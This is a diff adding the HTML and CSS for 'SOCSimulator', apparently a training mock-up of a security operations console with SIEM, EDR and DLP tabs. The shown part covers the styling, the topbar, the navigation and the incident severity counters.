@@ -1,0 +1,1877 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOCSimulator - Investigation Lab</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-base: #1b1a19;
+    --bg-surface: #252423;
+    --bg-elevated: #292827;
+    --bg-hover: #2d2c2b;
+    --bg-selected: #333231;
+    --border-subtle: #323130;
+    --border-medium: #3b3a39;
+    --border-strong: #484644;
+    --text-primary: #f3f2f1;
+    --text-secondary: #d2d0ce;
+    --text-tertiary: #a19f9d;
+    --text-muted: #8a8886;
+    --text-faint: #605e5c;
+    --accent-blue: #0078d4;
+    --accent-blue-light: #6cb8f6;
+    --accent-blue-dim: rgba(0,120,212,.08);
+    --sev-high: #d13438;
+    --sev-high-text: #f4a3a6;
+    --sev-high-bg: rgba(209,52,56,.1);
+    --sev-med: #ff8c00;
+    --sev-med-text: #ffb957;
+    --sev-med-bg: rgba(255,140,0,.1);
+    --sev-low: #fce100;
+    --sev-low-bg: rgba(252,225,0,.1);
+    --sev-info: #0078d4;
+    --sev-info-text: #6cb8f6;
+    --sev-info-bg: rgba(0,120,212,.1);
+    --success: #107c10;
+    --success-text: #6ccf6c;
+    --success-bg: rgba(16,124,16,.1);
+    --font-ui: 'DM Sans', 'Segoe UI', system-ui, sans-serif;
+    --font-mono: 'JetBrains Mono', 'Cascadia Code', 'Consolas', monospace;
+    --radius-sm: 4px;
+    --radius-md: 6px;
+    --radius-lg: 8px;
+    --shadow-card: 0 1px 3px rgba(0,0,0,.3), 0 0 0 1px var(--border-subtle);
+    --shadow-elevated: 0 4px 16px rgba(0,0,0,.4), 0 0 0 1px var(--border-subtle);
+    --shadow-panel: -4px 0 32px rgba(0,0,0,.6);
+    --t-fast: .15s cubic-bezier(.4,0,.2,1);
+    --t-med: .25s cubic-bezier(.4,0,.2,1);
+    --t-slow: .35s cubic-bezier(.22,1,.36,1);
+    --topbar-h: 48px;
+    --tabs-h: 42px;
+    --statusbar-h: 28px;
+  }
+
+  *, *::before, *::after { margin:0; padding:0; box-sizing:border-box }
+  html { font-size: 13px; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale }
+  body { font-family: var(--font-ui); background: var(--bg-base); color: var(--text-secondary); line-height: 1.5; overflow: hidden; height: 100vh }
+  a { color: var(--accent-blue-light); text-decoration: none }
+  a:hover { text-decoration: underline }
+  code { font-family: var(--font-mono); font-size: .92em }
+  strong { font-weight: 600 }
+  ::-webkit-scrollbar { width: 6px; height: 6px }
+  ::-webkit-scrollbar-track { background: transparent }
+  ::-webkit-scrollbar-thumb { background: var(--border-strong); border-radius: 10px }
+  ::-webkit-scrollbar-thumb:hover { background: var(--text-faint) }
+
+  /* ── Topbar ─────────────────────────────────────────────── */
+  .topbar {
+    background: #0a0a0a;
+    height: var(--topbar-h);
+    display: flex;
+    align-items: center;
+    padding: 0 16px;
+    border-bottom: 1px solid var(--border-subtle);
+    position: relative;
+    z-index: 100;
+    gap: 12px;
+    flex-shrink: 0;
+  }
+  .topbar .logo {
+    display: flex; align-items: center; gap: 10px;
+    color: #fff; font-size: 15px; font-weight: 700;
+    letter-spacing: -.02em; white-space: nowrap; user-select: none;
+  }
+  .topbar .logo img { width: 26px; height: 26px; border-radius: var(--radius-sm); object-fit: cover }
+  .topbar .logo .brand-accent { color: var(--accent-blue-light); font-weight: 300; margin-left: -2px }
+  .topbar .sep { width: 1px; height: 24px; background: var(--border-medium); flex-shrink: 0 }
+  .topbar .env-badge {
+    font-size: 9px; font-weight: 700; text-transform: uppercase; letter-spacing: .1em;
+    padding: 2px 7px; border-radius: 3px;
+    background: rgba(209,52,56,.15); color: var(--sev-high-text); border: 1px solid rgba(209,52,56,.3);
+  }
+  .search-wrap { position: relative; flex: 1; max-width: 360px }
+  .search-wrap .s-icon {
+    position: absolute; left: 10px; top: 50%; transform: translateY(-50%);
+    width: 13px; height: 13px; color: var(--text-faint); pointer-events: none;
+  }
+  .search-wrap .s-kbd {
+    position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+    font-size: 10px; font-family: var(--font-mono); color: var(--text-faint);
+    background: var(--bg-surface); border: 1px solid var(--border-subtle);
+    padding: 1px 5px; border-radius: 3px; pointer-events: none;
+  }
+  .search-wrap input {
+    background: var(--bg-elevated); border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-md); padding: 6px 50px 6px 30px;
+    color: var(--text-secondary); width: 100%; font-size: 12px; font-family: var(--font-ui);
+    transition: border-color var(--t-fast), box-shadow var(--t-fast); outline: none;
+  }
+  .search-wrap input::placeholder { color: var(--text-faint); font-size: 11.5px }
+  .search-wrap input:focus { border-color: var(--accent-blue); box-shadow: 0 0 0 2px rgba(0,120,212,.15) }
+  .topbar .right { margin-left: auto; display: flex; align-items: center; gap: 6px }
+  .tb-btn {
+    width: 34px; height: 34px; border-radius: var(--radius-sm); border: none;
+    background: transparent; color: var(--text-tertiary); cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+    transition: all var(--t-fast); position: relative; font-size: 16px;
+  }
+  .tb-btn:hover { background: var(--bg-hover); color: var(--text-primary) }
+  .tb-btn .notif-dot {
+    position: absolute; top: 5px; right: 5px; width: 8px; height: 8px;
+    border-radius: 50%; background: var(--sev-high); border: 2px solid #0a0a0a;
+    animation: pulse-dot 2s ease-in-out infinite;
+  }
+  @keyframes pulse-dot {
+    0%, 100% { opacity: 1 }
+    50% { opacity: .4 }
+  }
+  .topbar .tenant {
+    color: var(--text-muted); font-size: 10.5px; font-weight: 500; letter-spacing: .02em;
+    padding: 4px 8px; background: var(--bg-elevated); border-radius: var(--radius-sm);
+    border: 1px solid var(--border-subtle); display: flex; align-items: center; gap: 6px;
+  }
+  .topbar .tenant .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--success) }
+  .topbar .clock {
+    font-family: var(--font-mono); font-size: 11px; color: var(--text-muted);
+    min-width: 52px; text-align: right;
+  }
+  .topbar .avatar {
+    width: 28px; height: 28px; border-radius: 50%; background: var(--accent-blue);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 10px; font-weight: 700; color: #fff; cursor: pointer;
+    transition: box-shadow var(--t-fast);
+  }
+  .topbar .avatar:hover { box-shadow: 0 0 0 2px rgba(0,120,212,.4) }
+
+  /* ── Product Tabs ─────────────────────────────────────── */
+  .product-tabs {
+    background: var(--bg-surface); display: flex;
+    border-bottom: 1px solid var(--border-subtle);
+    padding: 0 16px; gap: 0; flex-shrink: 0; height: var(--tabs-h);
+  }
+  .product-tab {
+    padding: 0 16px; cursor: pointer; color: var(--text-tertiary);
+    font-weight: 600; font-size: 12px; position: relative;
+    border-bottom: 2px solid transparent; margin-bottom: -1px;
+    transition: all var(--t-fast); display: flex; align-items: center;
+    gap: 7px; user-select: none; letter-spacing: .01em;
+  }
+  .product-tab:hover { color: var(--text-secondary); background: var(--bg-hover) }
+  .product-tab.active { color: var(--accent-blue-light); border-bottom-color: var(--accent-blue-light) }
+  .product-tab .tab-icon { font-size: 14px; opacity: .7 }
+  .product-tab.active .tab-icon { opacity: 1 }
+  .product-tab .badge {
+    background: var(--sev-high); color: #fff; border-radius: 10px;
+    padding: 0 5px; font-size: 9.5px; font-weight: 700; line-height: 16px;
+    min-width: 16px; text-align: center;
+  }
+
+  /* ── Layout Shell ─────────────────────────────────────── */
+  .app-shell { display: flex; flex-direction: column; height: 100vh }
+  .main {
+    display: flex;
+    height: calc(100vh - var(--topbar-h) - var(--tabs-h) - var(--statusbar-h));
+    overflow: hidden;
+  }
+
+  /* ── Sidebar ──────────────────────────────────────────── */
+  .sidebar {
+    width: 218px; background: var(--bg-surface); border-right: 1px solid var(--border-subtle);
+    padding: 6px 0; overflow-y: auto; flex-shrink: 0;
+    display: flex; flex-direction: column;
+  }
+  .sidebar .nav-scroll { flex: 1; overflow-y: auto }
+  .sidebar .nav-item {
+    padding: 7px 14px 7px 16px; cursor: pointer;
+    display: flex; align-items: center; gap: 9px;
+    color: var(--text-tertiary); font-size: 12.5px; font-weight: 400;
+    border-left: 2px solid transparent; transition: all var(--t-fast); margin: 0;
+  }
+  .sidebar .nav-item:hover { background: var(--bg-hover); color: var(--text-secondary) }
+  .sidebar .nav-item.active {
+    background: var(--accent-blue-dim); color: var(--accent-blue-light);
+    border-left-color: var(--accent-blue-light); font-weight: 600;
+  }
+  .sidebar .nav-item .nav-badge {
+    margin-left: auto; font-size: 10px; font-weight: 600; color: var(--text-muted);
+    background: var(--bg-base); padding: 1px 6px; border-radius: 8px;
+    font-family: var(--font-mono);
+  }
+  .sidebar .nav-section {
+    padding: 14px 16px 5px; font-size: 10px; font-weight: 700;
+    text-transform: uppercase; color: var(--text-faint); letter-spacing: .08em;
+    display: flex; align-items: center; justify-content: space-between;
+    cursor: pointer; user-select: none;
+  }
+  .sidebar .nav-section .chev {
+    font-size: 10px; transition: transform var(--t-fast); color: var(--text-faint);
+  }
+  .sidebar .nav-section.collapsed .chev { transform: rotate(-90deg) }
+  .sidebar .nav-section.collapsed + .nav-group { display: none }
+  .sidebar .nav-group { /* wrapper for collapsible sections */ }
+  .sidebar .sidebar-footer {
+    border-top: 1px solid var(--border-subtle); padding: 8px 14px;
+    display: flex; gap: 6px; flex-shrink: 0;
+  }
+  .sidebar .sidebar-footer .sf-btn {
+    flex: 1; padding: 5px; border-radius: var(--radius-sm);
+    background: transparent; border: 1px solid var(--border-subtle);
+    color: var(--text-muted); font-size: 11px; cursor: pointer;
+    display: flex; align-items: center; justify-content: center; gap: 4px;
+    transition: all var(--t-fast); font-family: var(--font-ui);
+  }
+  .sidebar .sidebar-footer .sf-btn:hover {
+    background: var(--bg-hover); color: var(--text-secondary); border-color: var(--border-strong);
+  }
+
+  /* ── Content Area ─────────────────────────────────────── */
+  .content { flex: 1; overflow-y: auto; display: flex; flex-direction: column }
+  .content-header {
+    padding: 16px 24px 0; flex-shrink: 0;
+  }
+  .content-body { padding: 0 24px 24px; flex: 1 }
+  .breadcrumb {
+    font-size: 11px; color: var(--text-faint); margin-bottom: 6px;
+    display: flex; align-items: center; gap: 6px;
+  }
+  .breadcrumb span { color: var(--text-muted) }
+  .page-header {
+    display: flex; align-items: flex-start; justify-content: space-between;
+    margin-bottom: 16px; gap: 16px;
+  }
+  .page-title { font-size: 18px; font-weight: 700; color: var(--text-primary); letter-spacing: -.01em; line-height: 1.2 }
+  .subtitle { font-size: 11.5px; color: var(--text-muted); margin-top: 2px }
+  .page-actions { display: flex; gap: 6px; flex-shrink: 0 }
+  .btn {
+    padding: 6px 14px; border-radius: var(--radius-sm); font-size: 12px;
+    font-weight: 600; font-family: var(--font-ui); cursor: pointer;
+    display: inline-flex; align-items: center; gap: 5px;
+    transition: all var(--t-fast); border: 1px solid var(--border-subtle); white-space: nowrap;
+  }
+  .btn-ghost { background: transparent; color: var(--text-tertiary) }
+  .btn-ghost:hover { background: var(--bg-hover); color: var(--text-secondary); border-color: var(--border-strong) }
+  .btn-primary { background: var(--accent-blue); color: #fff; border-color: var(--accent-blue) }
+  .btn-primary:hover { background: #1a86d9; border-color: #1a86d9 }
+
+  /* ── Filter Bar ──────────────────────────────────────── */
+  .filter-bar {
+    display: flex; align-items: center; gap: 8px;
+    padding: 10px 0; margin-bottom: 12px; flex-wrap: wrap;
+  }
+  .filter-group { display: flex; align-items: center; gap: 4px }
+  .filter-label { font-size: 11px; color: var(--text-muted); font-weight: 600; margin-right: 2px }
+  .filter-pill {
+    padding: 4px 10px; border-radius: 12px; font-size: 11px; font-weight: 500;
+    cursor: pointer; border: 1px solid var(--border-subtle);
+    background: transparent; color: var(--text-tertiary);
+    transition: all var(--t-fast); font-family: var(--font-ui); user-select: none;
+  }
+  .filter-pill:hover { background: var(--bg-hover); color: var(--text-secondary); border-color: var(--border-strong) }
+  .filter-pill.active { background: var(--accent-blue-dim); color: var(--accent-blue-light); border-color: rgba(0,120,212,.3) }
+  .filter-pill .pill-dot { width: 6px; height: 6px; border-radius: 50%; display: inline-block; margin-right: 4px }
+  .filter-sep { width: 1px; height: 20px; background: var(--border-subtle); margin: 0 4px }
+  .filter-select {
+    padding: 4px 8px; border-radius: var(--radius-sm); font-size: 11px;
+    background: var(--bg-elevated); border: 1px solid var(--border-subtle);
+    color: var(--text-tertiary); font-family: var(--font-ui); cursor: pointer;
+    transition: all var(--t-fast); outline: none;
+  }
+  .filter-select:hover { border-color: var(--border-strong) }
+
+  /* ── Stat Cards ──────────────────────────────────────── */
+  .stats-row {
+    display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 10px; margin-bottom: 16px;
+  }
+  .stat-card {
+    background: var(--bg-elevated); border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-md); padding: 14px 16px;
+    transition: all var(--t-fast); position: relative; overflow: hidden; cursor: default;
+  }
+  .stat-card::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0;
+    height: 2px; background: var(--border-medium);
+  }
+  .stat-card:hover { box-shadow: var(--shadow-elevated); transform: translateY(-1px) }
+  .stat-card .label {
+    font-size: 10px; color: var(--text-muted); text-transform: uppercase;
+    margin-bottom: 4px; font-weight: 600; letter-spacing: .06em;
+  }
+  .stat-card .stat-row { display: flex; align-items: baseline; gap: 8px }
+  .stat-card .value {
+    font-size: 26px; font-weight: 700; color: var(--text-primary);
+    font-family: var(--font-mono); line-height: 1.1;
+  }
+  .stat-card .trend {
+    font-size: 10px; font-weight: 600; display: flex; align-items: center; gap: 2px;
+  }
+  .stat-card .trend.up { color: var(--sev-high-text) }
+  .stat-card .trend.down { color: var(--success-text) }
+  .stat-card .trend.flat { color: var(--text-faint) }
+  .stat-card .value.high { color: var(--sev-high) }
+  .stat-card .value.med  { color: var(--sev-med) }
+  .stat-card .value.low  { color: var(--sev-low) }
+  .stat-card .value.info { color: var(--sev-info) }
+  .stat-card:has(.value.high)::before { background: var(--sev-high) }
+  .stat-card:has(.value.med)::before  { background: var(--sev-med) }
+  .stat-card:has(.value.low)::before  { background: var(--sev-low) }
+  .stat-card:has(.value.info)::before { background: var(--sev-info) }
+
+  /* ── Cards & Tables ──────────────────────────────────── */
+  .card {
+    background: var(--bg-elevated); border-radius: var(--radius-md);
+    margin-bottom: 16px; box-shadow: var(--shadow-card); overflow: hidden;
+  }
+  .card-header {
+    padding: 10px 16px; border-bottom: 1px solid var(--border-subtle);
+    display: flex; align-items: center; justify-content: space-between;
+    font-weight: 600; color: var(--text-primary); font-size: 12px;
+  }
+  .card-header .refresh-time { font-size: 10.5px; color: var(--text-faint); font-weight: 400 }
+  table { width: 100%; border-collapse: collapse }
+  th {
+    text-align: left; padding: 8px 14px;
+    background: rgba(37,36,35,.7); color: var(--text-muted);
+    font-weight: 600; font-size: 10px; text-transform: uppercase;
+    letter-spacing: .07em; border-bottom: 1px solid var(--border-medium);
+    position: sticky; top: 0; white-space: nowrap; cursor: default;
+    user-select: none;
+  }
+  th .sort-icon { opacity: .3; margin-left: 3px; font-size: 9px }
+  th:hover .sort-icon { opacity: .6 }
+  td {
+    padding: 9px 14px; border-bottom: 1px solid rgba(50,49,48,.4);
+    font-size: 12.5px; vertical-align: middle;
+  }
+  tbody tr { transition: background var(--t-fast) }
+  tr.clickable { cursor: pointer }
+  tr.clickable:hover { background: rgba(255,255,255,.025) }
+  tr.clickable:active { background: rgba(255,255,255,.04) }
+  /* reserved */
+
+  /* ── Severity & Status ──────────────────────────────── */
+  .sev {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 2px 8px; border-radius: 3px; font-size: 10.5px; font-weight: 600; white-space: nowrap;
+  }
+  .sev-high { background: rgba(209,52,56,.1); color: var(--sev-high-text) }
+  .sev-med  { background: rgba(255,140,0,.1); color: var(--sev-med-text) }
+  .sev-low  { background: rgba(252,225,0,.1); color: var(--sev-low) }
+  .sev-info { background: rgba(0,120,212,.1); color: var(--sev-info-text) }
+  .sev-dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0 }
+  .sev-high .sev-dot { background: var(--sev-high) }
+  .sev-med  .sev-dot { background: var(--sev-med) }
+  .sev-low  .sev-dot { background: var(--sev-low) }
+  .sev-info .sev-dot { background: var(--sev-info) }
+  .status {
+    padding: 2px 8px; border-radius: 3px; font-size: 10.5px; font-weight: 600; white-space: nowrap;
+  }
+  .status-new    { background: rgba(0,120,212,.1); color: var(--sev-info-text) }
+  .status-active { background: rgba(209,52,56,.1); color: var(--sev-high-text) }
+  .status-closed { background: rgba(16,124,16,.1); color: var(--success-text) }
+  .status-resolved { background: rgba(16,124,16,.1); color: var(--success-text) }
+
+  /* ── Detail Panel ─────────────────────────────────────── */
+  .detail-overlay {
+    display: none; position: fixed; inset: 0;
+    background: rgba(0,0,0,.5); z-index: 200;
+    backdrop-filter: blur(3px); -webkit-backdrop-filter: blur(3px);
+    opacity: 0; transition: opacity var(--t-med);
+  }
+  .detail-overlay.open { display: block; opacity: 1 }
+  .detail-panel {
+    position: fixed; top: 0; right: 0; width: 760px; max-width: 94vw;
+    height: 100vh; background: var(--bg-base); border-left: 1px solid var(--border-medium);
+    overflow-y: auto; z-index: 201;
+    transform: translateX(100%); transition: transform var(--t-slow);
+    box-shadow: var(--shadow-panel); display: flex; flex-direction: column;
+  }
+  .detail-overlay.open .detail-panel { transform: translateX(0) }
+  .detail-top {
+    padding: 16px 24px 12px; border-bottom: 1px solid var(--border-subtle);
+    flex-shrink: 0; position: sticky; top: 0; background: var(--bg-base); z-index: 5;
+  }
+  .detail-top-row {
+    display: flex; align-items: flex-start; justify-content: space-between; gap: 12px;
+  }
+  .detail-close {
+    background: var(--bg-elevated); border: 1px solid var(--border-subtle);
+    color: var(--text-tertiary); font-size: 15px; cursor: pointer;
+    padding: 4px 8px; border-radius: var(--radius-sm); line-height: 1;
+    transition: all var(--t-fast); flex-shrink: 0;
+  }
+  .detail-close:hover { color: var(--text-primary); background: var(--bg-hover); border-color: var(--border-strong) }
+  .detail-title {
+    font-size: 16px; font-weight: 700; color: var(--text-primary);
+    line-height: 1.3; letter-spacing: -.01em;
+  }
+  .detail-sub { font-size: 11px; color: var(--text-muted); margin-top: 4px }
+  .detail-actions {
+    display: flex; gap: 6px; margin-top: 12px; flex-wrap: wrap;
+  }
+  .detail-body { padding: 20px 24px; flex: 1; overflow-y: auto }
+  .detail-section { margin-bottom: 22px }
+  .detail-section-title {
+    font-size: 10px; font-weight: 700; color: var(--text-muted);
+    text-transform: uppercase; letter-spacing: .08em;
+    margin-bottom: 10px; padding-bottom: 6px; border-bottom: 1px solid var(--border-subtle);
+  }
+  .detail-grid {
+    display: grid; grid-template-columns: 135px 1fr;
+    gap: 7px 12px; font-size: 12.5px;
+  }
+  .detail-grid .lbl { color: var(--text-muted); font-weight: 600 }
+  .detail-grid .val { color: var(--text-secondary) }
+
+  /* ── Timeline ────────────────────────────────────────── */
+  .timeline { position: relative; padding-left: 24px }
+  .timeline::before {
+    content: ''; position: absolute; left: 7px; top: 4px; bottom: 4px;
+    width: 2px; background: var(--border-medium); border-radius: 1px;
+  }
+  .timeline-item {
+    position: relative; margin-bottom: 12px; padding: 10px 14px;
+    background: var(--bg-elevated); border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-md); transition: border-color var(--t-fast);
+  }
+  .timeline-item:hover { border-color: var(--border-strong) }
+  .timeline-item::before {
+    content: ''; position: absolute; left: -21px; top: 14px;
+    width: 9px; height: 9px; border-radius: 50%;
+    background: var(--border-strong); border: 2px solid var(--bg-base);
+  }
+  .timeline-item.ti-high::before { background: var(--sev-high); box-shadow: 0 0 0 2px rgba(209,52,56,.2) }
+  .timeline-item.ti-med::before  { background: var(--sev-med); box-shadow: 0 0 0 2px rgba(255,140,0,.2) }
+  .timeline-item.ti-low::before  { background: var(--sev-low); box-shadow: 0 0 0 2px rgba(252,225,0,.2) }
+  .timeline-item.ti-info::before { background: var(--sev-info); box-shadow: 0 0 0 2px rgba(0,120,212,.2) }
+  .timeline-time { font-size: 10px; color: var(--text-muted); margin-bottom: 2px; font-family: var(--font-mono); font-weight: 500 }
+  .timeline-title { font-size: 12.5px; font-weight: 600; color: var(--text-primary) }
+  .timeline-desc { font-size: 11.5px; color: var(--text-tertiary); margin-top: 5px; line-height: 1.55 }
+
+  /* ── Process Tree ────────────────────────────────────── */
+  .ptree {
+    font-family: var(--font-mono); font-size: 11.5px;
+    background: rgba(0,0,0,.3); border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-md); padding: 16px 18px;
+    line-height: 1.9; overflow-x: auto; white-space: pre;
+  }
+  .ptree .proc { color: var(--accent-blue-light); font-weight: 500 }
+  .ptree .susp { color: var(--sev-high); font-weight: 700 }
+  .ptree .arg  { color: var(--text-tertiary); font-weight: 400 }
+  .ptree .pipe { color: var(--border-strong) }
+
+  /* ── Evidence / Entities / Banners ─────────────────── */
+  .evidence-block {
+    background: var(--bg-elevated); border-left: 3px solid var(--sev-high);
+    padding: 10px 14px; margin-bottom: 8px; border-radius: 0 var(--radius-md) var(--radius-md) 0;
+    font-size: 12px;
+  }
+  .evidence-block.benign { border-left-color: var(--success) }
+  .evidence-block .ev-title { font-weight: 600; color: var(--text-primary); margin-bottom: 5px }
+  .evidence-block .ev-detail {
+    color: var(--text-tertiary); font-family: var(--font-mono);
+    font-size: 10.5px; line-height: 1.6; word-break: break-word;
+  }
+  .entity {
+    display: inline-flex; align-items: center; gap: 5px;
+    background: var(--bg-elevated); border: 1px solid var(--border-subtle);
+    border-radius: var(--radius-sm); padding: 4px 10px; font-size: 11px; margin: 2px;
+    transition: all var(--t-fast); cursor: default;
+  }
+  .entity:hover { border-color: var(--border-strong); background: var(--bg-hover) }
+  .entity-icon { font-size: 12px }
+  .banner {
+    padding: 12px 16px; border-radius: var(--radius-md); margin-bottom: 16px;
+    font-size: 12px; display: flex; align-items: flex-start; gap: 8px; line-height: 1.5;
+  }
+  .banner-info { background: rgba(0,120,212,.06); border: 1px solid rgba(0,120,212,.15) }
+  .banner-warn { background: rgba(255,140,0,.06); border: 1px solid rgba(255,140,0,.15) }
+  .banner-icon { font-size: 14px; flex-shrink: 0; margin-top: 1px }
+  .kv-row { display: flex; gap: 8px; padding: 6px 0; border-bottom: 1px solid rgba(50,49,48,.4); font-size: 12px }
+  .kv-row:last-child { border-bottom: none }
+  .kv-row .k { color: var(--text-muted); min-width: 120px; flex-shrink: 0; font-weight: 600 }
+  .kv-row .v { color: var(--text-secondary); word-break: break-word }
+  .mono { font-family: var(--font-mono); font-size: 11px }
+  .tag {
+    background: var(--border-medium); color: var(--text-secondary);
+    padding: 2px 7px; border-radius: 3px; font-size: 10.5px;
+    display: inline-block; margin: 1px; font-weight: 500;
+  }
+  .hidden { display: none }
+
+  /* ── Status Bar ──────────────────────────────────────── */
+  .statusbar {
+    height: var(--statusbar-h); background: var(--accent-blue);
+    display: flex; align-items: center; padding: 0 16px; gap: 16px;
+    font-size: 11px; color: rgba(255,255,255,.9); flex-shrink: 0;
+    user-select: none;
+  }
+  .statusbar .sb-sep { width: 1px; height: 14px; background: rgba(255,255,255,.2) }
+  .statusbar .sb-item { display: flex; align-items: center; gap: 5px }
+  .statusbar .sb-dot { width: 7px; height: 7px; border-radius: 50%; background: #4cff4c }
+  .statusbar .sb-right { margin-left: auto; display: flex; align-items: center; gap: 14px }
+
+  /* ── Toast Notification ──────────────────────────────── */
+  .toast {
+    position: fixed; top: 60px; right: 20px; z-index: 300;
+    background: var(--bg-elevated); border: 1px solid var(--border-medium);
+    border-left: 3px solid var(--sev-high); border-radius: var(--radius-md);
+    padding: 12px 16px; box-shadow: 0 8px 32px rgba(0,0,0,.5);
+    max-width: 360px; animation: toast-in .4s ease-out forwards;
+    display: flex; align-items: flex-start; gap: 10px;
+  }
+  .toast.hiding { animation: toast-out .3s ease-in forwards }
+  .toast-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px }
+  .toast-content { flex: 1 }
+  .toast-title { font-size: 12px; font-weight: 600; color: var(--text-primary); margin-bottom: 2px }
+  .toast-msg { font-size: 11px; color: var(--text-tertiary) }
+  .toast-close {
+    background: none; border: none; color: var(--text-faint); cursor: pointer;
+    font-size: 14px; padding: 0; line-height: 1;
+  }
+  .toast-close:hover { color: var(--text-primary) }
+  @keyframes toast-in {
+    from { opacity: 0; transform: translateX(40px) }
+    to { opacity: 1; transform: translateX(0) }
+  }
+  @keyframes toast-out {
+    from { opacity: 1; transform: translateX(0) }
+    to { opacity: 0; transform: translateX(40px) }
+  }
+  @keyframes fadeUp {
+    from { opacity: 0; transform: translateY(4px) }
+    to   { opacity: 1; transform: translateY(0) }
+  }
+  .content-body { animation: fadeUp .25s ease-out }
+
+  /* ── Responsive ──────────────────────────────────────── */
+  @media (max-width: 900px) {
+    .sidebar { width: 180px }
+    .detail-panel { width: 100vw; max-width: 100vw }
+    .topbar .tenant, .topbar .clock { display: none }
+  }
+  @media (max-width: 680px) {
+    .sidebar { display: none }
+    .search-wrap { max-width: 180px }
+    .stats-row { grid-template-columns: 1fr 1fr }
+    .product-tab { padding: 0 10px; font-size: 11px }
+    .content-header, .content-body { padding-left: 14px; padding-right: 14px }
+    .filter-bar { gap: 4px }
+  }
+</style>
+</head>
+<body>
+<div class="app-shell">
+
+<!-- ═══ TOPBAR ═══ -->
+<div class="topbar">
+  <div class="logo">
+    <img src="soc.jpg" alt="SOCSimulator">
+    SOC<span class="brand-accent">Simulator</span>
+  </div>
+  <div class="sep"></div>
+  <span class="env-badge">PROD</span>
+  <div class="search-wrap">
+    <svg class="s-icon" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="7" cy="7" r="5.5"/><line x1="11" y1="11" x2="14.5" y2="14.5"/></svg>
+    <input type="text" placeholder="Search incidents, alerts, entities...">
+    <span class="s-kbd">Ctrl+K</span>
+  </div>
+  <div class="right">
+    <div class="clock" id="live-clock">--:--</div>
+    <div class="sep"></div>
+    <button class="tb-btn" title="Notifications">
+      &#128276;
+      <span class="notif-dot"></span>
+    </button>
+    <button class="tb-btn" title="Settings">&#9881;</button>
+    <div class="sep"></div>
+    <span class="tenant"><span class="dot"></span> Contoso Corp</span>
+    <div class="avatar" title="SOC Analyst">SO</div>
+  </div>
+</div>
+
+<!-- ═══ PRODUCT TABS ═══ -->
+<div class="product-tabs">
+  <div class="product-tab active" onclick="switchProduct('sentinel', this)">
+    <span class="tab-icon">&#128737;</span>
+    Sentinel (SIEM)
+    <span class="badge">11</span>
+  </div>
+  <div class="product-tab" onclick="switchProduct('dfe', this)">
+    <span class="tab-icon">&#128187;</span>
+    Defender for Endpoint (EDR)
+    <span class="badge">8</span>
+  </div>
+  <div class="product-tab" onclick="switchProduct('dlp', this)">
+    <span class="tab-icon">&#128274;</span>
+    DLP (Purview)
+    <span class="badge">9</span>
+  </div>
+</div>
+
+<!-- ╔═══════════════════════════════════════════════════════╗
+     ║  SENTINEL (SIEM)                                     ║
+     ╚═══════════════════════════════════════════════════════╝ -->
+<div id="sentinel" class="main">
+  <div class="sidebar">
+    <div class="nav-scroll">
+      <div class="nav-section" onclick="this.classList.toggle('collapsed')">General <span class="chev">&#9660;</span></div>
+      <div class="nav-group">
+        <div class="nav-item">&#128200; Overview</div>
+        <div class="nav-item active">&#128680; Incidents <span class="nav-badge">11</span></div>
+        <div class="nav-item">&#128214; Workbooks</div>
+      </div>
+      <div class="nav-section" onclick="this.classList.toggle('collapsed')">Threat Management <span class="chev">&#9660;</span></div>
+      <div class="nav-group">
+        <div class="nav-item">&#128269; Hunting</div>
+        <div class="nav-item">&#128221; Entity behavior</div>
+        <div class="nav-item">&#127758; Threat intelligence</div>
+      </div>
+      <div class="nav-section" onclick="this.classList.toggle('collapsed')">Configuration <span class="chev">&#9660;</span></div>
+      <div class="nav-group">
+        <div class="nav-item">&#9881; Analytics</div>
+        <div class="nav-item">&#128268; Data connectors</div>
+        <div class="nav-item">&#129302; Automation</div>
+      </div>
+    </div>
+    <div class="sidebar-footer">
+      <button class="sf-btn">&#128218; Docs</button>
+      <button class="sf-btn">&#128172; Feedback</button>
+    </div>
+  </div>
+  <div class="content">
+    <div class="content-header">
+      <div class="breadcrumb">SOCSimulator <span>&#8250;</span> Sentinel <span>&#8250;</span> <strong>Incidents</strong></div>
+      <div class="page-header">
+        <div>
+          <div class="page-title">Incidents</div>
+          <div class="subtitle">Active incidents from the last 24 hours &mdash; Workspace: contoso-soc-prod</div>
+        </div>
+        <div class="page-actions">
+          <button class="btn btn-ghost">&#8635; Refresh</button>
+          <button class="btn btn-ghost">&#128229; Export</button>
+        </div>
+      </div>
+      <div class="stats-row">
+        <div class="stat-card"><div class="label">High Severity</div><div class="stat-row"><span class="value high">2</span><span class="trend up">&#9650; +2</span></div></div>
+        <div class="stat-card"><div class="label">Medium Severity</div><div class="stat-row"><span class="value med">4</span><span class="trend up">&#9650; +2</span></div></div>
+        <div class="stat-card"><div class="label">Low Severity</div><div class="stat-row"><span class="value low">3</span><span class="trend down">&#9660; -1</span></div></div>
+        <div class="stat-card"><div class="label">Informational</div><div class="stat-row"><span class="value info">2</span><span class="trend flat">&mdash; 0</span></div></div>
+      </div>
+      <div class="filter-bar">
+        <span class="filter-label">Severity:</span>
+        <div class="filter-group">
+          <button class="filter-pill active" onclick="this.classList.toggle('active')"><span class="pill-dot" style="background:var(--sev-high)"></span>High</button>
